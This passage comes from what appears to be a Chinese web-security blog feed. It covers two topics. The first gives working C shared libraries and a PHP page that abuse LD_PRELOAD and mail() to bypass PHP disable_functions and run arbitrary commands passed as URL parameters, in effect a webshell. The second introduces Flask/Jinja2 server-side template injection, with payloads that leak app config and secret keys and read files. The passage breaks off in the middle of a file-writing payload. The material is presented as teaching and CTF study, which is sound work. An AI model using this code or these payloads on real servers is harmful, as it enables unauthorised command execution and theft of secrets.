...&gt;</span><br><span class="line">[pid 29094] execve(<span class="string">"/bin/sh"</span>, [<span class="string">"sh"</span>, <span class="string">"-c"</span>, <span class="string">"/usr/sbin/sendmail -t -i "</span>], [/* 24 vars */]) = 0</span><br><span class="line">[pid 29094] brk(NULL)                   = 0x557087f3b000</span><br><span class="line">[pid 29094] access(<span class="string">"/etc/ld.so.nohwcap"</span>, F_OK) = -1 ENOENT (No such file or directory)</span><br><span class="line">--</span><br><span class="line">strace: Process 29095 attached</span><br><span class="line">[pid 29094] wait4(-1,  &lt;unfinished ...&gt;</span><br><span class="line">[pid 29095] execve(<span class="string">"/usr/sbin/sendmail"</span>, [<span class="string">"/usr/sbin/sendmail"</span>, <span class="string">"-t"</span>, <span class="string">"-i"</span>], [/* 24 vars */]) = 0</span><br><span class="line">[pid 29095] brk(NULL)                   = 0xe2b000</span><br><span class="line">[pid 29095] fcntl(0, F_GETFD)           = 0</span><br></pre></td></tr></table></figure><p>简单分析一下，第一个execve是启动PHP解释器而已，除此之外必须找到第二个execve，没有则说明并未启动新进程；这里第二和第三个execve都是直接或间接调用系统sendmail程序，这就对了。</p><p>注意一点，通过/bin/sh方式调用sendmail的execve，我们在看/bin/sh程序的调用哪些API时会发现，其实也是调用了getuid()：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@sq:/tmp<span class="comment"># strace -f /bin/sh 2&gt;&amp;1 | grep -A5 -B5 getuid</span></span><br><span class="line">arch_prctl(ARCH_SET_FS, 0x7fed795b5700) = 0</span><br><span class="line">mprotect(0x7fed79392000, 16384, PROT_READ) = 0</span><br><span class="line">mprotect(0x5567a6f01000, 8192, PROT_READ) = 0</span><br><span class="line">mprotect(0x7fed795c1000, 4096, PROT_READ) = 0</span><br><span class="line">munmap(0x7fed795b7000, 37845)           = 0</span><br><span class="line">getuid()                                = 0</span><br><span class="line">getgid()                                = 0</span><br><span class="line">getpid()                                = 29796</span><br><span class="line">rt_sigaction(SIGCHLD, &#123;0x5567a6cf5540, ~[RTMIN RT_1], SA_RESTORER, 0x7fed790074b0&#125;, NULL, 8) = 0</span><br><span class="line">geteuid()                               = 0</span><br><span class="line">brk(NULL)                               = 0x5567a87fe000</span><br></pre></td></tr></table></figure><p>也就是说，<strong>如果别的环境和我本地的一样，在mail()中存在启动execve调用了/bin/sh程序来间接调用sendmail的这种情况，即使目标系统未安装或未开启sendmail程序，我仍然可以通过PHP的mail()函数来触发调用了/bin/sh程序的execve，从而调用getuid()达到执行劫持函数的目的。</strong></p><h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>编写test.c，劫持getuid()函数，获取LD_PRELOAD环境变量并预加载恶意的共享库，再删除环境变量 LD_PRELOAD，最后执行由EVIL_CMDLINE环境变量获取的系统命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line">        <span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">        unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">        system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当这个共享库中的getuid()被调用时，尝试加载payload()函数执行命令。</p><p>接着用以下语句编译C文件为共享对象文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC test.c -o test.so</span><br></pre></td></tr></table></figure><p>最后编写test.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里接受3个参数，一是cmd参数，待执行的系统命令；二是outpath参数，保存命令执行输出结果的文件路径，便于在页面上显示，另外该参数，你应注意web是否有读写权限、web是否可跨目录访问、文件将被覆盖和删除等几点；三是sopath参数，指定劫持系统函数的共享对象的绝对路径。</p><p>这里通过putenv()函数将LD_PRELOAD环境变量设置为恶意的test.so、将自定义的EVIL_CMDLINE环境变量赋值为要执行的命令；然后调用mail()函数触发sendmail()，再通过sendmail()触发getuid()从而使恶意的test.so被加载执行；最后再输出内容到页面上并删除临时存放命令执行结果的文件。</p><p>访问test.php，输入相应的参数即可执行成功：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/5.png" alt=""></p><p>其实本地测试发现，即使Linux系统未安装或未启用sendmail，还是能够成功触发Bypass，这和前面分析的mail()会启动/bin/sh进而调用getuid()有关，验证了这种方法的特殊性。</p><h3 id="Method2——劫持启动进程"><a href="#Method2——劫持启动进程" class="headerlink" title="Method2——劫持启动进程"></a>Method2——劫持启动进程</h3><h4 id="基本原理-1"><a href="#基本原理-1" class="headerlink" title="基本原理"></a>基本原理</h4><p>第一种方法是劫持getuid()，是较为常用的方法，但存在缺陷：</p><ul><li>目标Linux未安装或为启用sendmail；</li><li>即便目标可以启用sendmail，由于未将主机名添加进hosts中，导致每次运行sendmail都要耗时半分钟等待域名解析超时返回，www-data也无法将主机名加入hosts；</li></ul><blockquote><p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！</p><p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。</p><p>此外，我通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 <code>extern char** environ</code>！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。</p></blockquote><h4 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>bypass_disablefunc.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv("LD_PRELOAD") no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着用以下语句编译C文件为共享对象文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so</span><br></pre></td></tr></table></figure><p>bypass_disablefunc.php，代码和test.php一致：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问bypass_disablefunc.php，输入参数设置LD_PRELOAD环境变量和要执行的命令的值，页面直接返回命令执行结果：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/6.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/web/192052.html" target="_blank" rel="noopener">无需 sendmail：巧用 LD_PRELOAD 突破 disable_functions</a></p><p><a href="http://blog.leanote.com/post/xuxi/PHP-Webshell%E4%B8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%99%90%E5%88%B6%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">PHP Webshell下命令执行限制及绕过disable_function方法总结</a></p>]]></content>
    
    <summary type="html">
    
      未完待续...
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>浅析Python Flask SSTI</title>
    <link href="https://Mi1k7ea.github.com/2019/06/02/%E6%B5%85%E6%9E%90Python-Flask-SSTI/"/>
    <id>https://Mi1k7ea.github.com/2019/06/02/浅析Python-Flask-SSTI/</id>
    <published>2019-06-02T03:18:04.000Z</published>
    <updated>2019-06-02T10:01:47.981Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-SSTI"><a href="#0x01-SSTI" class="headerlink" title="0x01 SSTI"></a>0x01 SSTI</h2><p>SSTI(Server-Side Template Injection)，即服务端模板注入攻击，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的。</p><p>通常在CTF中多是以Python的Flask框架结合Jinja2的形式出现。</p><h2 id="0x02-背景知识"><a href="#0x02-背景知识" class="headerlink" title="0x02 背景知识"></a>0x02 背景知识</h2><h3 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h3><p>Flask是一个使用Python编写的轻量级Web应用框架。其 WSGI 工具箱采用Werkzeug，模板引擎则使用Jinja2。</p><h3 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h3><p>Jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。</p><p>在Jinja2中，存在三种语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br><span class="line">注释 &#123;# #&#125;</span><br></pre></td></tr></table></figure><p>Jinja2模板中使用上述第二种的语法表示一个变量，它是一种特殊的占位符。当利用Jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，Jinja2支持Python中所有的Python数据类型比如列表、字段、对象等。被两个括号包裹的内容会输出其表达式的值。</p><p>Jinja2中的过滤器可以理解为是Jinja2里面的内置函数和字符串处理函数。</p><h3 id="模板渲染函数"><a href="#模板渲染函数" class="headerlink" title="模板渲染函数"></a>模板渲染函数</h3><h4 id="render-template"><a href="#render-template" class="headerlink" title="render_template()"></a>render_template()</h4><p>使用render_template()方法可以渲染模板，你只要提供模板名称和需要作为参数传递给模板的变量就行了。</p><p>渲染过程如下，render_template()函数的第一个参数为渲染的目标html页面、第二个参数为需要加载到页面指定标签位置的内容，来自网上摘的一个图：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/1.png" alt=""></p><p>其实render_template()的功能是先引入home.html，同时根据后面传入的参数，对html进行修改渲染。</p><p>注意：当在HTML模板中在标签内传入的内容是通过如<code></code>而非%s这种传参形式时，HTML自动转义默认开启。因此，如果 name 包含 HTML ，那么会被自动转义。</p><p>这里我们搭个简单的Demo瞧瞧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, render_template_string, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_ssti</span><span class="params">()</span>:</span></span><br><span class="line">    person = &#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">'hello'</span>,</span><br><span class="line">        <span class="string">'secret'</span>: <span class="string">'This_is_my_secret'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'name'</span>):</span><br><span class="line">        person[<span class="string">'name'</span>] = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, person=person)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>然后在当前目录新建templates目录，在其中新建index.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello &#123;&#123; person.name &#125;&#125;!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><p>开启Flask服务，访问输入参数name，在页面会直接显示出来：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/2.png" alt=""></p><p>当尝试进行XSS时，会自动被HTML编码过滤：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/3.png" alt=""></p><h4 id="render-template-string"><a href="#render-template-string" class="headerlink" title="render_template_string()"></a>render_template_string()</h4><p>这个函数作用和前面的类似，顾名思义，区别在于只是第一个参数并非是文件名而是字符串。<strong>也就是说，我们不需要再在templates目录中新建HTML文件了，而是可以直接将HTML代码写到一个字符串中，然后使用该函数渲染该字符串中的HTML代码到页面即可</strong>。</p><p>基于前面修改的Demo如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, render_template_string, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_ssti</span><span class="params">()</span>:</span></span><br><span class="line">    person = &#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">'hello'</span>,</span><br><span class="line">        <span class="string">'secret'</span>: <span class="string">'This_is_my_secret'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'name'</span>):</span><br><span class="line">        person[<span class="string">'name'</span>] = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    template = <span class="string">'&lt;h2&gt;Hello &#123;&#123; person.name &#125;&#125;!&lt;/h2&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>访问的结果和前面的一样，而且也是自动进行了HTML实体编码。</p><h2 id="0x03-漏洞点"><a href="#0x03-漏洞点" class="headerlink" title="0x03 漏洞点"></a>0x03 漏洞点</h2><p>前面简单说了下两个模板渲染函数的原理，那么漏洞点在哪里呢？</p><p>由前面知道，要想实现模板注入，首先必须得注入模板执行语句，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br></pre></td></tr></table></figure><p>但是在前面两个函数的Demo中，html内容中是以<code></code>这种变量取值语句的形式来处理传入的参数的，此时person.name的值无论是什么内容，都会被当作是字符串来进行处理而非模板语句来执行，比如即使传入的是config来构成<code></code>，但其也只会把参数值当作是字符串而非模板语句：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/4.png" alt=""></p><p>既然这样，要想整个参数输入的内容被当成是模板语句来执行，就只能是通过%s这种传参形式来实现了，修改的Demo如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, render_template_string, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_ssti</span><span class="params">()</span>:</span></span><br><span class="line">    person = &#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">'hello'</span>,</span><br><span class="line">        <span class="string">'secret'</span>: <span class="string">'This_is_my_secret'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'name'</span>):</span><br><span class="line">        person[<span class="string">'name'</span>] = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    <span class="comment"># changed</span></span><br><span class="line">    template = <span class="string">'&lt;h2&gt;Hello %s!&lt;/h2&gt;'</span> % person[<span class="string">'name'</span>]</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>此时将<code></code>换成了%s，通过传入字符串的方式传入内容，当传入恶意构造的模板语句时就会造成SSTI。</p><p>验证漏洞，传入模板变量语句<code>3</code>，注意加号要URL编码，当看到返回3时证明语句成功注入执行了：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/5.png" alt=""></p><p>这里就能得出结论了：</p><ul><li>SSTI漏洞点为在render_template_string()函数中，作为模板的字符串参数中的传入参数是通过%s的形式获取而非变量取值语句的形式获取，从而导致攻击者通过构造恶意的模板语句来注入到模板中、模板解析执行了模板语句从而实现SSTI攻击；</li><li>SSTI漏洞风险只出现在render_template_string()函数，而render_template()函数并不存在SSTI风险，因为render_template()函数中是传入到一个模板HTML文件中，而该html文件这种的变量取值语句实现不了修改成%s这种形式的；</li></ul><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>这里Demo就拿上一小节的就好。</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>传入什么返回什么，第一时间想到的就是XSS。之前的变量取值语句传入时是会进行自动HTML编码的，但%s传入的参数是不会自动进行HTML编码的，因为Flask并没有将整个内容视为字符串。</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/6.png" alt=""></p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>访问对应的全局变量即可直接泄露出配置文件的内容。</p><p>比如config变量：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/7.png" alt=""></p><p>还有Demo中secret变量：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/8.png" alt=""></p><p>某些情况下，当获取secret_key后，即可对session进行重新签名，完成session的伪造。</p><p>注意：Flask的session是保存在客户端，称为客户端session，会进行编码和校验。</p><p>整合一下可利用的PoC技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config&#125;&#125;</span><br><span class="line">?name=&#123;&#123;person.secret&#125;&#125;</span><br><span class="line">?name=&#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config&#125;&#125;</span><br><span class="line">?name=&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>这里需要用到Python沙箱逃逸的元素链，这里直接给出payload，具体构造过程可参考<a href="https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/" target="_blank" rel="noopener">《Python沙箱逃逸小结》</a>。</p><p><strong>读文件</strong></p><p>这里只给个演示的poc，其他绕过类的poc参考<a href="https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/" target="_blank" rel="noopener">《Python沙箱逃逸小结》</a>构造即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Python2</span><br><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;E:/passwd&apos;).read()&#125;&#125;</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;).read()</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;E:/passwd&apos;).read()</span><br><span class="line"></span><br><span class="line"># Python3中无file，只能用open</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;E:/passwd&apos;).read()</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/9.png" alt=""></p><p><strong>写文件</strong></p><p>这里只给个演示的poc，其他绕过类的poc参考<a href="https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/" target="_blank" rel="noopener">《Python沙箱逃逸小结》</a>构造即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 